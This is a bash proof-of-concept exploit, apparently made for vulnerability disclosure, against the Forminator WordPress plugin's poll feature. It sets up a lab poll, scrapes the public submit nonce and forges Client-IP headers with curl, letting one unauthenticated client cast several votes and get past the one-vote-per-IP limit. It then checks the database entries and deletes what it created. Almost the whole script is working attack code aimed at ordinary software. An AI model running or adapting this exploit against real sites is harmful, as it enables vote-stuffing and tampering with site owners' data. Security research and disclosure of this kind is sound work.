#!/usr/bin/env bash
# PoC — forminator F2: unauth poll vote-stuffing / one-vote-per-IP bypass via spoofable
# Client-IP/X-Real-IP/X-Forwarded-For headers in Forminator_Geo::get_user_ip() (library/class-geo.php:113)
# Target: forminator 1.55.1 (unfixed through 1.57.0) · verified lab OTW: WP 6.8.3 + PHP 7.4 (fpm)
#  eng-05a72a8104de · 2026-08-18
#
# Preconditions (honest access level):
#   - a published Forminator POLL (default votes method = user IP, i.e. enable-votes-method != browser_cookie)
#   - default poll = ONE vote per IP EVER (enable-votes-limit unset) — strongest gate this bypasses
#   - site NOT behind a header-sanitizing proxy / NOT on Cloudflare (is_cloudflare() false) — default lab shape
# Access: UNAUTHENTICATED (poll submit nonce is rendered in the public page)
#
# Asserts on the SIDE-EFFECT (DB rows + distinct recorded IPs), never on HTTP codes alone.
# Restores every row it creates.
set -euo pipefail

BASE="${1:-http://127.0.0.1:8090}"
WPCLI="${WPCLI:-/home/mcipekci/wp/php7.4/php /home/mcipekci/wp/wp-cli.phar}"
WPPATH="${WPPATH:-labs/lab_forminator_1.55.1_wp6.8.3_php7.4/web}"
MARK="RS_F2_$(date +%s)"
IP1="10.99.$((RANDOM%200+10)).$((RANDOM%200+10))"
IP2="10.99.$((RANDOM%200+10)).$((RANDOM%200+10))"
DBQ() { $WPCLI --url="$BASE" --path="$WPPATH" db query "$1" 2>/dev/null; }

echo "[*] marker=$MARK spoof_ips=$IP1/$IP2"

# --- setup: poll (default IP method = one vote per IP ever) + page ---
POLL=$(MK="$MARK" $WPCLI --url="$BASE" --path="$WPPATH" eval '
$pid = wp_insert_post(array("post_type"=>"forminator_polls","post_status"=>"publish","post_title"=>getenv("MK")));
if(!$pid||is_wp_error($pid)) { fwrite(STDERR,"setup failed\n"); exit(1); }
update_post_meta($pid,"forminator_form_meta",array(
  "settings"=>array("poll-title"=>getenv("MK"),"poll-description"=>"lab","results-style"=>"bar","enable-results"=>"true"),
  "fields"=>array(
    array("id"=>"answer-1","element_id"=>"answer-1","title"=>"RS_ALPHA","type"=>"answer","color"=>"#51cfd2","wrapper_id"=>"wrapper-1"),
    array("id"=>"answer-2","element_id"=>"answer-2","title"=>"RS_BETA","type"=>"answer","color"=>"#56d28c","wrapper_id"=>"wrapper-2"))));
echo $pid;')
PAGE=$(MK="${MARK}pg" PID="$POLL" $WPCLI --url="$BASE" --path="$WPPATH" eval 'echo wp_insert_post(array("post_type"=>"page","post_status"=>"publish","post_title"=>getenv("MK"),"post_content"=>"[forminator_poll id=\"".getenv("PID")."\"]"));')
echo "[*] poll=$POLL page=$PAGE"

NONCE=$(curl -sL "$BASE/?page_id=$PAGE" | grep -oE 'name="forminator_nonce" value="[a-f0-9]+"' | head -1 | grep -oE '[a-f0-9]{10}')
[ -n "$NONCE" ] || { echo "FAIL: no submit nonce scraped"; exit 1; }

vote() { curl -s -H "Client-IP: $2" -X POST "$BASE/wp-admin/admin-ajax.php" \
  --data "action=forminator_submit_form_poll&form_id=$POLL&forminator_nonce=$NONCE&$POLL=answer-1"; }

echo "[1] vote D (spoof $IP1) — expect success"
D=$(vote D "$IP1"); echo "$D" | grep -q '"success":true' || { echo "FAIL: D rejected: $D"; exit 1; }
echo "[2] vote E (spoof $IP2, SAME real socket) — expect success (bypass)"
E=$(vote E "$IP2"); echo "$E" | grep -q '"success":true' || { echo "FAIL: E rejected (bypass failed): $E"; exit 1; }
echo "[3] control F (repeat $IP1) — expect rejection (gate keys on spoofed header)"
F=$(vote F "$IP1"); echo "$F" | grep -q 'already submitted' || { echo "FAIL: control not rejected (gate inert?)"; exit 1; }

echo "[4] side-effect assert: two entries, two distinct attacker-chosen recorded IPs, one real socket"
ROWS=$(DBQ "SELECT entry_id, (SELECT meta_value FROM wp_frmt_form_entry_meta m WHERE m.entry_id=e.entry_id AND m.meta_key='_forminator_user_ip') FROM wp_frmt_form_entry e WHERE e.form_id=$POLL;")
echo "$ROWS"
N=$(DBQ "SELECT COUNT(*) FROM wp_frmt_form_entry WHERE form_id=$POLL;" | grep -oE '[0-9]+' | tail -1)
[ "$N" = "2" ] || { echo "FAIL: expected 2 entries, got $N"; exit 1; }
echo "$ROWS" | grep -q "$IP1" && echo "$ROWS" | grep -q "$IP2" \
  || { echo "FAIL: recorded IPs are not the spoofed values"; exit 1; }
echo "$ROWS" | grep -q "127.0.0.1" && { echo "FAIL: real IP recorded (unexpected)"; exit 1; }

echo "[5] cleanup"
DBQ "DELETE m FROM wp_frmt_form_entry_meta m JOIN wp_frmt_form_entry e ON e.entry_id=m.entry_id WHERE e.form_id=$POLL;"
DBQ "DELETE FROM wp_frmt_form_entry WHERE form_id=$POLL;"
$WPCLI --url="$BASE" --path="$WPPATH" post delete "$POLL" "$PAGE" --force >/dev/null
echo "RS_OK $MARK — unauth one-vote-per-IP bypass confirmed (2 entries / 1 socket / spoofed IPs recorded)"
